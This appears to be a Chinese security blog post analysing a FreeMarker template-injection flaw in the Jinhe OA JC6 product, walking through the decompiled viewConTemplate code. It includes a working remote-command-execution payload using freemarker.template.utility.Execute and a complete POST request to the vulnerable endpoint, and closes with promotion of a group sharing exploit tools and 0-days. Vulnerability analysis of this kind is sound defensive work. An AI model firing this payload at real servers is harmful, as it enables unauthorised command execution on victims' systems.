#  金和OA JC6 FreeMarker模板注入漏洞简析   
原创 chobits02  C4安全团队   2024-06-10 21:51  
  
    
点击**星标**  
关注公众号，不再迷路~  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTKibORjdHmN1koMPJsibjeKRRNe5bzW6LZbcrP6nrulZkElKkapLMIoXbEKh91xOARoJCfO62pw7GQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
## 01 分析  
  
**开局一张图，CSDN上分享出来的只带POC的文章**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRQtJT1xEqdzIiasibF5h0TAPP5icrteurBRiatn69TkFicp1x6pHdzAAM6WHqvngWQIfvLQ8xicZ8TZotg/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞出现在  
viewConTemplate.action  
方法中，完整URL为：  
```
/jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action
```  
  
金和Jc6完全由Java开发编写，因此审计时候直接反编译Jar文件即可  
  
搜索  
viewConTemplate方法，位于  
portalwbConTemplateAction类中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRQtJT1xEqdzIiasibF5h0TAPdAWQMBibQRYUcmTWkdPSIgfCqePzqXpvfBozsoO5yibyxXYVKauKFUIw/640?wx_fmt=png&from=appmsg "")  
  
  
viewConTemplate方法的代码很短很简单，来分析下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRQtJT1xEqdzIiasibF5h0TAPiaopM9Picul6NWELiaaeN7CnLddGUxRg16r85ucRHVUwepibNAiagW9L5lA/640?wx_fmt=png&from=appmsg "")  
  
  
首先代码如下：  
```
FileOutputStream out = null;
    try {
      String sameName = this.uuid + ".ftl";
      File file = new File(PortalTemplateUtil.TEMPLATE_TEMP_DIR);
      if (!file.exists())
        file.mkdirs(); 
      out = new FileOutputStream(PortalTemplateUtil.TEMPLATE_TEMP_DIR + File.separator + sameName);
      String code = this.request.getParameter("code");
      code = URLDecoder.decode(code, "UTF-8");
      code = code.replaceAll("&lt;", "<").replaceAll("&quot;", "\"").replaceAll("&#39;", "'").replaceAll("&gt;", ">").replaceAll("&nbsp;", " ").replaceAll("<br />", "").replaceAll("<p>", "").replaceAll("</p>", "").replaceAll("&amp;", "&");
      byte[] b = code.getBytes();
      out.write(b);
      out.flush();
      try {
        if (out != null)
          out.close(); 
      } catch (IOException e) {
        e.printStackTrace();
      }
```  
  
  
判断是否存在临时目录，不存在则新建目录和文件名  
```
String sameName = this.uuid + ".ftl";
File file = new File(PortalTemplateUtil.TEMPLATE_TEMP_DIR);
if (!file.exists())
file.mkdirs(); 
out = new FileOutputStream(PortalTemplateUtil.TEMPLATE_TEMP_DIR + File.separator + sameName);
```  
  
  
通过code参数接收模板内容，并替换编码的字符  
```
String code = this.request.getParameter("code");
code = code.replaceAll("&lt;", "<").replaceAll("&quot;", "\"").replaceAll("&#39;", "'").replaceAll("&gt;", ">").replaceAll("&nbsp;", " ").replaceAll("<br />", "").replaceAll("<p>", "").replaceAll("</p>", "").replaceAll("&amp;", "&");
```  
  
之后写入临时文件中  
```
byte[] b = code.getBytes();
out.write(b);
out.flush();
```  
  
接着来到渲染模板的功能  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRQtJT1xEqdzIiasibF5h0TAPZ6hclW1Z9VCqgkFRJaxCME94mEAvLKZjEIAEbkWd1LUUTRGKeY6J1w/640?wx_fmt=png&from=appmsg "")  
  
  
  
此处读取临时文件内容，并渲染成Freemarker的模板，因为模板内容可以指定就造成了注入漏洞  
  
咱们构造POC为：  
```
code=${"freemarker.template.utility.Execute"?new()("whoami")}
```  
  
使用Freemarker自带的 freemarker.template.utility.Execute类里面命令执行方法，执行获取回显  
  
  
  
  
之后根据前端页面接收参数，再传参uuid、moduId进行请求  
  
  
  
  
构造请求数据包如下：  
```
POST /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

moduId=1&code=${"freemarker.template.utility.Execute"?new()("whoami")}&uuid=1
```  
  
执行whoami命令，获得当前身份回显  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRQtJT1xEqdzIiasibF5h0TAP4iaicBEemoUDNvoGBy3qHxhReB7HowT8ovOXEBIRLBVHpALupH2DFFWw/640?wx_fmt=png&from=appmsg "")  
  
至此FreeMarker模板注入漏洞分析完毕  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRQtJT1xEqdzIiasibF5h0TAPEibHQia0ek1GatlxxeibWvd6ibpWSsVian2MvwBdzFgGNGQCqEOtSSk4apw/640?wx_fmt=png&from=appmsg "")  
  
  
端午节快乐  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRQtJT1xEqdzIiasibF5h0TAPoPZsibLDOIRvGqT9d7n97aMyz7ic5UoCknibq7OfpUPluCWRkQqYt3zLg/640?wx_fmt=png&from=appmsg "")  
  
**加入「安全渗透感知大家族」，你会获得:**  
  
**1.内部分享的漏洞利用工具；**  
  
**2.实战挖掘漏洞时的Tips和注意点；**  
  
**3.各类网安资料、漏洞挖掘思路、免杀、代码审计实例、CTF等文章；**  
  
**4.0 day漏洞不定期分享和利用分析；**  
  
**5.内部交流社群；**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRQtJT1xEqdzIiasibF5h0TAP9EvE9Mmc3XFXNcCRrraG2SHzP2hnK6XYlTHJfK8Ntx8TYCJUWBkpZA/640?wx_fmt=png&from=appmsg "")  
  
  
  
**网安资源资源定期更新**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRQtJT1xEqdzIiasibF5h0TAPia9RIg821TmsIrgUAQ4qlpwKicnLFOEsgTN9xftfY0kts8QqnVMiaErSA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRQtJT1xEqdzIiasibF5h0TAPNiaGGiboKz2skkB5LAsyjdticStUO04X0ZVJg6vjvYMRoMvcVWQhX8Opw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
END  
  
  
关注HackingWiki漏洞感知  
  
了解更多安全相关内容~  
  
  
  
  
